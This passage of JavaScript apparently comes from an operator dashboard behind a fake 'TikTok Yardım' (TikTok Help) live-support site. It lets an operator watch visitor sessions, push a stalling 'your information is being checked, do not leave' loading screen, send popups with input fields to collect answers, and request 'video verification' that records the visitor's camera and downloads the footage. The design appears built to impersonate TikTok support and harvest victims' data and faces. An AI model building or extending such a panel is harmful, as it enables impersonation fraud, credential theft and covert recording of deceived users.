  stopRecordingWatch();
  stopAdminCall(false, { keepUi: false });
  clearRecordingLink();
  resetLiveVideoUi();
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
}

function msgWhoExport(msg) {
  if (msg?.from === "admin" || msg?.who === "admin") return "Destek";
  if (msg?.who === "user") return "Ziyaretçi";
  if (msg?.who === "bot") return "Asistan";
  return String(msg?.who || "Bilinmeyen");
}

function formatChatExportTxt(sessionId, meta, messages) {
  const lines = [
    "TikTok Yardım — Sohbet dışa aktarım",
    `Oturum: #${shortId(sessionId)} (${sessionId})`,
    `Sayfa: ${meta?.page || "/"}`,
    `Dışa aktarım: ${new Date().toLocaleString("tr-TR")}`,
    `Mesaj sayısı: ${messages.length}`,
    "".padEnd(48, "-"),
    "",
  ];
  messages.forEach((msg) => {
    const when = msg.ts ? new Date(msg.ts).toLocaleString("tr-TR") : "-";
    const who = msgWhoExport(msg);
    let kind = "";
    if (msg.type === "camera") kind = " [kamera]";
    else if (msg.type === "popup") kind = " [popup]";
    else if (msg.type === "loading") kind = " [yükleme]";
    lines.push(`[${when}] ${who}${kind}`);
    lines.push(String(msg.text || "").trim() || "(boş)");
    lines.push("");
  });
  if (!messages.length) lines.push("(Bu sohbette mesaj yok)");
  return lines.join("\n");
}

function downloadTextFile(filename, text) {
  const blob = new Blob([text], { type: "text/plain;charset=utf-8" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  a.style.display = "none";
  document.body.appendChild(a);
  a.click();
  a.remove();
  window.setTimeout(() => URL.revokeObjectURL(url), 5000);
}

async function exportSelectedChat() {
  if (!selectedId || !window.ChatSync?.getSessionMessages) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce soldan bir sohbet seçin.";
    return;
  }
  sendHint.hidden = false;
  sendHint.textContent = "Sohbet dışa aktarılıyor…";
  try {
    const [messages, meta] = await Promise.all([
      window.ChatSync.getSessionMessages(selectedId),
      window.ChatSync.getSessionMeta?.(selectedId),
    ]);
    const body = formatChatExportTxt(selectedId, meta || {}, messages);
    const stamp = new Date().toISOString().slice(0, 19).replace(/[:T]/g, "-");
    downloadTextFile(`sohbet-${shortId(selectedId)}-${stamp}.txt`, body);
    sendHint.textContent = `Dışa aktarıldı (${messages.length} mesaj).`;
    window.setTimeout(() => {
      if (sendHint.textContent.includes("Dışa aktarıldı")) sendHint.hidden = true;
    }, 2500);
  } catch (err) {
    sendHint.textContent = `Dışa aktarılamadı: ${err?.message || err}`;
  }
}

async function clearSelectedChat() {
  if (!selectedId || !window.ChatSync?.clearSessionMessages) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce soldan bir sohbet seçin.";
    return;
  }
  const ok = window.confirm(
    `Seçili sohbet (#${shortId(selectedId)}) temizlensin mi?\nMesajlar ve kamera oturumu silinir; oturum listede kalır.`
  );
  if (!ok) return;
  sendHint.hidden = false;
  sendHint.textContent = "Sohbet temizleniyor…";
  try {
    stopRecordingWatch();
    await stopAdminCall(false, { keepUi: false });
    await window.ChatSync.clearSessionMessages(selectedId);
    clearThreadUi();
    // Dinleyiciyi yenile — temiz sonrası yeni mesajlar gelsin
    if (unsubMessages) unsubMessages();
    const listenStartedAt = Date.now();
    unsubMessages = window.ChatSync.listenMessages(selectedId, (msg) => {
      const isLive = !msg.ts || Number(msg.ts) >= listenStartedAt - 2500;
      appendThreadMessage(msg, isLive);
    });
    sendHint.textContent = "Sohbet temizlendi.";
    window.setTimeout(() => {
      if (sendHint.textContent.includes("temizlendi")) sendHint.hidden = true;
    }, 2000);
  } catch (err) {
    sendHint.textContent = `Temizlenemedi: ${err?.message || err}`;
  }
}

async function clearAllChats() {
  if (!window.ChatSync?.clearAllSessions) return;
  const ok = window.confirm(
    "TÜM sohbetler silinsin mi?\nBu işlem geri alınamaz. Tüm oturumlar ve mesajlar kalkar."
  );
  if (!ok) return;
  const ok2 = window.confirm("Emin misiniz? Tüm sohbetler kalıcı olarak silinecek.");
  if (!ok2) return;
  sendHint.hidden = false;
  sendHint.textContent = "Tüm sohbetler siliniyor…";
  try {
    stopRecordingWatch();
    await stopAdminCall(false, { keepUi: false });
    const n = await window.ChatSync.clearAllSessions();
    resetSelectedSessionUi();
    sendHint.textContent = `${n} sohbet silindi.`;
    window.setTimeout(() => {
      if (sendHint.textContent.includes("silindi")) sendHint.hidden = true;
    }, 2500);
  } catch (err) {
    sendHint.textContent = `Silinemedi: ${err?.message || err}`;
  }
}

function openSession(row) {
  selectedId = row.id;
  setThreadToolsEnabled(true);
  seenMessageIds = new Set();
  threadMessages.innerHTML = "";
  threadTitle.textContent = `Oturum #${shortId(row.id)}`;
  threadMeta.textContent = `${row.page || "/"} · ${fmtTime(row.updatedAt)}`;
  sendHint.hidden = true;
  stopRecordingWatch();
  stopAdminCall(false, { keepUi: false });
  clearRecordingLink();
  resetLiveVideoUi();
  if (reopenCameraBtn) reopenCameraBtn.hidden = true;
  Array.from(sessionList.querySelectorAll(".session-item")).forEach((el) => {
    el.classList.toggle("is-active", el.dataset.sessionId === row.id);
  });

  if (unsubMessages) unsubMessages();
  const listenStartedAt = Date.now();
  unsubMessages = window.ChatSync.listenMessages(row.id, (msg) => {
    // Geçmiş mesajlar alarm üretmesin; yalnızca canlı gelenler
    const isLive = !msg.ts || Number(msg.ts) >= listenStartedAt - 2500;
    appendThreadMessage(msg, isLive);
  });
  replyInput?.focus();
}

async function sendToSelected(text, options = {}) {
  const msg = String(
    text ||
      (options.type === "loading"
        ? "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…"
        : options.type === "camera"
          ? "Görüntülü doğrulama için kameranızı açmanız isteniyor. Açarsanız görüntü bu destek oturumuna bağlanır ve oturum kaydı alınır."
          : "")
  ).trim();
  if (!msg && options.type !== "loading") return;
  if (!selectedId) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce soldan bir sohbet seçin.";
    return;
  }
  if (sending) return;
  sending = true;
  sendHint.hidden = false;
  sendHint.textContent = "Gönderiliyor…";
  const releaseSending = window.setTimeout(() => {
    if (sending) sending = false;
  }, 20000);
  try {
    const result = await window.ChatSync.sendAdminMessage(selectedId, msg, options);
    sendHint.textContent =
      options.type === "loading"
        ? "Yükleme animasyonu gönderildi."
        : options.type === "popup"
          ? "Popup gönderildi."
          : options.type === "camera"
            ? "Kamera talebi gönderildi."
            : "Gönderildi.";
    if (options.type === "camera" && result?.callId) {
      resetLiveVideoUi();
      await joinAdminCamera(selectedId, result.callId);
    }
    if (options.type !== "loading" && options.type !== "popup" && options.type !== "camera") {
      replyInput.value = "";
    }
    window.setTimeout(() => {
      if (
        sendHint.textContent.includes("Gönderildi") ||
        sendHint.textContent.includes("animasyon") ||
        sendHint.textContent.includes("Popup") ||
        sendHint.textContent.includes("Kamera")
      ) {
        sendHint.hidden = true;
      }
    }, 1200);
  } catch (err) {
    const detail = err?.code || err?.message || String(err);
    sendHint.textContent = `Gönderilemedi: ${detail}`;
  } finally {
    window.clearTimeout(releaseSending);
    sending = false;
  }
}

function renderQuickButtons() {
  const list = window.ChatSync.getQuickReplies();
  quickList.innerHTML = "";
  list.forEach((text) => {
    const btn = document.createElement("button");
    btn.type = "button";
    btn.textContent = text.length > 48 ? `${text.slice(0, 48)}…` : text;
    btn.title = text;
    btn.addEventListener("click", () => sendToSelected(text));
    quickList.appendChild(btn);
  });
}

function renderTemplatesEditor(list) {
  templatesEditor.innerHTML = "";
  (list.length ? list : [""]).forEach((text, index) => {
    const row = document.createElement("div");
    row.className = "template-row";
    row.innerHTML = `
      <label class="visually-hidden" for="tpl-${index}">Hazır mesaj ${index + 1}</label>
      <textarea id="tpl-${index}" rows="2" maxlength="800" data-tpl>${escapeHtml(text)}</textarea>
      <button type="button" class="chat-clear" data-remove="${index}">Sil</button>
    `;
    const ta = row.querySelector("textarea");
    ta.value = text;
    templatesEditor.appendChild(row);
  });
}

function readTemplatesFromEditor() {
  return Array.from(templatesEditor.querySelectorAll("[data-tpl]"))
    .map((el) => el.value.trim())
    .filter(Boolean);
}

function startDash(sync) {
  show("dash");
  renderQuickButtons();
  renderTemplatesEditor(sync.getQuickReplies());
  knownSessionIds = new Set();
  sessionsHydrated = false;
  // Giriş jesti ile alarmı hazırla (ses kilidi açılır)
  if (!alertsArmed) {
    armAlerts().catch(() => {
      alertsArmed = true;
      if (notifyBtn) notifyBtn.textContent = "🔔 Alarmları aç (tıkla)";
    });
  }
  if (unsubSessions) unsubSessions();
  unsubSessions = sync.listenSessions((rows) => {
    const ids = rows.map((r) => r.id);
    if (!sessionsHydrated) {
      ids.forEach((id) => knownSessionIds.add(id));
      sessionsHydrated = true;
      renderSessions(rows);
      if (!selectedId && rows[0]) openSession(rows[0]);
      return;
    }

    const fresh = rows.filter((r) => !knownSessionIds.has(r.id));
    fresh.forEach((r) => {
      knownSessionIds.add(r.id);
      fireHighAlert({
        kicker: "YENİ ZİYARETÇİ",
        title: "Siteye yeni kullanıcı girdi",
        body: `#${shortId(r.id)} · ${r.page || "/"} · ${String(r.preview || "Sohbet başladı").slice(0, 100)}`,
        tag: `session-${r.id}`,
      });
    });
    // Silinenleri setten çıkar
    const live = new Set(ids);
    knownSessionIds.forEach((id) => {
      if (!live.has(id)) knownSessionIds.delete(id);
    });

    renderSessions(rows);
    if (!selectedId && rows[0]) openSession(rows[0]);
  });
}

replyForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  sendToSelected(replyInput.value);
});

sendLoadingBtn?.addEventListener("click", () => {
  sendToSelected(
    "Bilgileriniz kontrol ediliyor. Lütfen bu sayfadan ayrılmayın…",
    { type: "loading" }
  );
});

exportChatBtn?.addEventListener("click", () => {
  void exportSelectedChat();
});
clearChatBtn?.addEventListener("click", () => {
  void clearSelectedChat();
});
clearAllChatsBtn?.addEventListener("click", () => {
  void clearAllChats();
});

sendCameraBtn?.addEventListener("click", () => {
  void (async () => {
    if (sending) {
      sendHint.hidden = false;
      sendHint.textContent = "Gönderiliyor, bekleyin…";
      return;
    }
    // Eski oturum kilidi kaldıysa önce temizle; yeni talebi engelleme
    if (adminCall) {
      sendHint.hidden = false;
      sendHint.textContent = "Önceki kamera oturumu kapatılıyor…";
      try {
        await endActiveCameraSession();
      } catch (err) {
        console.error(err);
        adminCall = null;
      }
    }
    await sendToSelected(
      "Görüntülü doğrulama için kameranızı açmanız isteniyor. Açarsanız görüntü bu destek oturumuna bağlanır ve oturum kaydı alınır.",
      {
        type: "camera",
        okLabel: "İzin ver",
        cancelLabel: "Reddet",
      }
    );
  })();
});

async function endActiveCameraSession() {
  const call = adminCall;
  if (!call) {
    adminCall = null;
    setEndCameraVisible(false);
    setHideCameraVisible(false);
    if (reopenCameraBtn) reopenCameraBtn.hidden = true;
    return;
  }
  const { sessionId, callId } = call;
  const pending = {
    sessionId,
    callId,
    lastBlob: null,
    seenRecordingUrl: call.seenRecordingUrl || null,
    awaitingRecording: true,
  };
  setCameraUi(true, "Oturum sonlandırılıyor…");
  adminCameraBox?.classList.remove("is-recording");
  setEndCameraVisible(false);

  // Listener çakışmasın diye önce aboneliği kes, sonra Firebase’e bitiş yaz
  try {
    call.unsubCall?.();
    call.unsubCall = null;
    call.unsubIce?.();
    call.unsubIce = null;
  } catch {
    /* ignore */
  }

  try {
    if (sessionId && callId && window.ChatSync) {
      try {
        if (window.ChatSync.forceEndCameraCall) {
          await window.ChatSync.forceEndCameraCall(sessionId, callId);
        } else {
          await window.ChatSync.setCameraCallStatus(sessionId, callId, "ended");
        }
      } catch (err) {
        console.error(err);
        sendHint.hidden = false;
        sendHint.textContent = `Sonlandırılamadı: ${err?.message || err}`;
      }
    }

    try {
      await stopAdminRecording(call, { autoDownload: false });
      pending.lastBlob = call.lastBlob || null;
    } catch {
      /* ignore */
    }

    try {
      call.pc?.close();
      call.pc = null;
    } catch {
      /* ignore */
    }
    if (adminRemoteVideo) adminRemoteVideo.srcObject = null;

    if (pending.lastBlob?.size) {
      forceDownloadBlob(pending.lastBlob, `kamera-admin-${shortId(sessionId)}.webm`);
      setCameraUi(true, "Yerel kayıt indirildi · Storage yedek bekleniyor…");
    } else {
      setCameraUi(true, "Ziyaretçi kaydı yükleniyor…");
    }

    startRecordingWatch(sessionId, callId, pending);

    sendHint.hidden = false;
    sendHint.textContent = pending.lastBlob?.size
      ? "Oturum bitti · yerel kayıt indirildi. Storage kaydı gelirse o da iner."
      : "Oturum bitti · ziyaretçi kaydı bekleniyor (Storage).";
    if (reopenCameraBtn) reopenCameraBtn.hidden = false;
    window.setTimeout(() => {
      if (
        sendHint.textContent.includes("Oturum bitti") ||
        sendHint.textContent.includes("Oturum sonlandır")
      ) {
        sendHint.hidden = true;
      }
    }, 5000);
  } finally {
    if (adminCall === call) adminCall = null;
    setEndCameraVisible(false);
  }
}

endCameraBtn?.addEventListener("click", () => {
  endActiveCameraSession();
});
endCameraBtnModal?.addEventListener("click", () => {
  endActiveCameraSession();
});

hideCameraBtn?.addEventListener("click", () => {
  hideCameraPopup();
});
hideCameraPanelBtn?.addEventListener("click", () => {
  hideCameraPopup();
});
hideCameraBtnModal?.addEventListener("click", () => {
  hideCameraPopup();
});
reopenCameraBtn?.addEventListener("click", () => {
  showCameraPopup();
});

(function wireCameraDrag() {
  const panel = document.getElementById("admin-camera-panel");
  const handle = document.getElementById("admin-camera-drag");
  if (!panel || !handle) return;

  let dragging = false;
  let startX = 0;
  let startY = 0;
  let originLeft = 0;
  let originTop = 0;

  const onMove = (clientX, clientY) => {
    if (!dragging) return;
    const dx = clientX - startX;
    const dy = clientY - startY;
    const maxLeft = Math.max(8, window.innerWidth - panel.offsetWidth - 8);
    const maxTop = Math.max(8, window.innerHeight - panel.offsetHeight - 8);
    const left = Math.min(maxLeft, Math.max(8, originLeft + dx));
    const top = Math.min(maxTop, Math.max(8, originTop + dy));
    panel.style.left = `${left}px`;
    panel.style.top = `${top}px`;
    panel.style.right = "auto";
    panel.style.bottom = "auto";
    panel.style.transform = "none";
  };

  handle.addEventListener("pointerdown", (e) => {
    if (e.button != null && e.button !== 0) return;
    if (e.target.closest("#hide-camera-btn")) return;
    dragging = true;
    panel.classList.add("is-dragging");
    const rect = panel.getBoundingClientRect();
    startX = e.clientX;
    startY = e.clientY;
    originLeft = rect.left;
    originTop = rect.top;
    panel.style.left = `${rect.left}px`;
    panel.style.top = `${rect.top}px`;
    panel.style.transform = "none";
    handle.setPointerCapture?.(e.pointerId);
    e.preventDefault();
  });

  handle.addEventListener("pointermove", (e) => onMove(e.clientX, e.clientY));
  handle.addEventListener("pointerup", (e) => {
    dragging = false;
    panel.classList.remove("is-dragging");
    handle.releasePointerCapture?.(e.pointerId);
  });
  handle.addEventListener("pointercancel", () => {
    dragging = false;
    panel.classList.remove("is-dragging");
  });
})();

sendPopupBtn?.addEventListener("click", () => {
  const question = String(popupText?.value || "").trim();
  if (!question) {
    sendHint.hidden = false;
    sendHint.textContent = "Önce popup metnini yazın (ziyaretçiye soru).";
    popupText?.focus();
    return;
  }
  sendToSelected(question, {
    type: "popup",
    okLabel: popupOk?.value || "Tamam",
    cancelLabel: popupCancel?.value || "İptal",
    withInput: true,
    placeholder: popupPlaceholder?.value || "Mesajınızı buraya yazın…",
  });
});

templatesForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  const saved = window.ChatSync.setQuickReplies(readTemplatesFromEditor());
  renderTemplatesEditor(saved);
  renderQuickButtons();
  templatesSaved.hidden = false;
  window.setTimeout(() => {
    templatesSaved.hidden = true;
  }, 1500);
});

addTemplateBtn?.addEventListener("click", () => {
  const list = readTemplatesFromEditor();
  list.push("");
  renderTemplatesEditor(list);
  templatesEditor.querySelector("textarea:last-of-type")?.focus();
});

resetTemplatesBtn?.addEventListener("click", () => {
  const defaults = [...window.ChatSync.DEFAULT_QUICK_REPLIES];
  window.ChatSync.setQuickReplies(defaults);
  renderTemplatesEditor(defaults);
  renderQuickButtons();
});

templatesEditor?.addEventListener("click", (e) => {
  const btn = e.target.closest("[data-remove]");
  if (!btn) return;
  const list = readTemplatesFromEditor();
  const idx = Number(btn.getAttribute("data-remove"));
  list.splice(idx, 1);
  renderTemplatesEditor(list.length ? list : [""]);
});

notifyBtn?.addEventListener("click", () => {
  void armAlerts();
});

alertDismiss?.addEventListener("click", () => {
  hideAdminAlert();
});
alertOverlay?.addEventListener("click", (e) => {
  if (e.target === alertOverlay) hideAdminAlert();
});

logoutBtn?.addEventListener("click", () => {
  setAuth(false);
  if (unsubSessions) unsubSessions();
  if (unsubMessages) unsubMessages();
  stopAdminCall(true);
  hideAdminAlert();
  selectedId = null;
  alertsArmed = false;
  sessionsHydrated = false;
  knownSessionIds = new Set();
  if (titleFlashTimer) {
    clearInterval(titleFlashTimer);
    titleFlashTimer = null;
  }
  document.title = originalTitle || "Canlı Destek Paneli";
  show("login");
});

loginForm?.addEventListener("submit", (e) => {
  e.preventDefault();
  const pass = String(document.getElementById("admin-pass")?.value || "").trim();
  const expected = String(window.FIREBASE_SYNC?.adminPassword || "").trim();
  const ok =
    expected.length > 0 &&
    (pass === expected || pass.replace(/\s+/g, "") === expected.replace(/\s+/g, ""));

  if (!window.FIREBASE_SYNC) {
    loginError.hidden = false;
    loginError.textContent = "firebase-config.js yüklenemedi. Sayfayı Ctrl+F5 ile yenileyin.";
    return;
  }
  if (!ok) {
    loginError.hidden = false;
    loginError.textContent =
      expected.length === 0
        ? "Config içinde admin şifresi yok."
        : `Şifre hatalı (yazılan ${pass.length} karakter, beklenen ${expected.length}).`;
    return;
  }
  loginError.hidden = true;
  setAuth(true);
  startDash(window.ChatSync);
});

const sync = await ready();
if (!sync) {
  show("setup");
  const lede = document.querySelector("#setup-panel .lede");
  if (lede) {
    lede.textContent =
      "Firebase scriptleri yüklenemedi veya çok yavaş. Ctrl+F5 ile yenileyin. İnternet/engelleyici varsa kapatın.";
  }
} else if (sync.needsSetup) {
  show("setup");
} else if (authOk()) {
  startDash(sync);
} else {
  show("login");
}
